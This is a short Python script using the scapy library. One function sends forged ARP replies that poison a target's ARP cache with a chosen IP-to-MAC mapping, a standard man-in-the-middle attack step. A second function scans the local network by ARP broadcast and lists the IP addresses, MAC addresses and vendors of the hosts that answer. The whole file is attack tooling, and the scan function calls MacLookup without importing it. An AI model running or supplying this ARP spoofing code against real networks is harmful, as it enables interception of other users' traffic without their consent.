import scapy.all as scapy

def spoof(targetIp, spoofIp):
    packet = scapy.ARP(op=2, pdst=targetIp, hwdst="00:23:d1:d0:cd:21", psrc=spoofIp)
    scapy.send(packet)

def scan(ip):
    arpRequest = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arpRequestBroadcast = broadcast/arpRequest
    answered = scapy.srp(arpRequestBroadcast, timeout=1, verbose=False)[0]

    print("IP\t\t\tMAC Address\t\t\tVendor\n-----------------------------------------------------------")
    for el in answered:
        print(el[1].psrc + "\t\t" + el[1].hwsrc + "\t\t" + MacLookup().lookup(el[1].hwsrc))
